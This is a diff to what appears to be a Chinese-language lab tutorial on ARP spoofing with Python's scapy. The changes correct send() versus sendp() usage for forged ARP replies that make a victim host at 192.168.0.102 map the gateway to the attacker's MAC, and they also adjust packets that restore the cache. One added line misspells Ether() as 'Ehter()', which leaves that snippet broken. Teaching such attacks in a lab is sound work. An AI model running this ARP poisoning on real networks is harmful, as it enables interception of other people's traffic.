@@ -99,10 +99,18 @@ gw_mac = recved[0][0][1].hwsrc
 # 伪造网关的 ARP 响应包
 # 准备发送给受害者主机 192.168.0.102
 # ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
-arpspoofed=ARP(op=2, psrc="192.168.0.1", pdst="192.168.0.102", hwdst="08:00:27:bd:92:09")
+arpspoofed_l3=ARP(op=2, psrc="192.168.0.1", pdst="192.168.0.102", hwdst="08:00:27:bd:92:09")
 
 # 发送上述伪造的 ARP 响应数据包到受害者主机
-sendp(arpspoofed)
+# 注意：send() 发送的是 3 层报文，不能直接发送二层报文
+send(arpspoofed_l3)
+
+# 如果想使用 sendp() 函数，就需要手动构造二层报文头部
+# 在 scapy 中可以通过 help(send) 和 help(sendp) 查看使用差异
+arpspoofed_l2=Ehter()/ARP(op=2, psrc="192.168.0.1", pdst="192.168.0.102", hwdst="08:00:27:bd:92:09")
+sendp(arpspoofed_l2)
+# 注意，如果发送失败，需要指定 sendp() 的 iface 参数为发送报文的网卡名称
+# 例如： sendp(arpspoofed_l2, iface="eth2")
 ```
 
 此时在受害者主机上查看 ARP 缓存会发现网关的 MAC 地址已被「替换」为攻击者主机的 MAC 地址
@@ -119,10 +127,10 @@ ip neigh
 # 恢复受害者主机的 ARP 缓存记录
 ## 伪装网关给受害者发送 ARP 响应
 restorepkt1 = ARP(op=2, psrc="192.168.0.1", hwsrc="08:00:27:2a:4b:04", pdst="192.168.0.102", hwdst="08:00:27:aa:ff:3e")
-sendp(restorepkt1, count=100, inter=0.2)
+send(restorepkt1, count=100, inter=0.2)
 ## （可选）伪装受害者给网关发送 ARP 响应
 restorepkt2 = ARP(op=2, pdst="192.168.0.1", hwdst="08:00:27:2a:4b:04", psrc="192.168.0.102", hwsrc="08:00:27:aa:ff:3e")
-sendp(restorepkt2, count=100, inter=0.2)
+send(restorepkt2, count=100, inter=0.2)
 ```
 
 此时在受害者主机上准备“刷新”网关 ARP 记录。
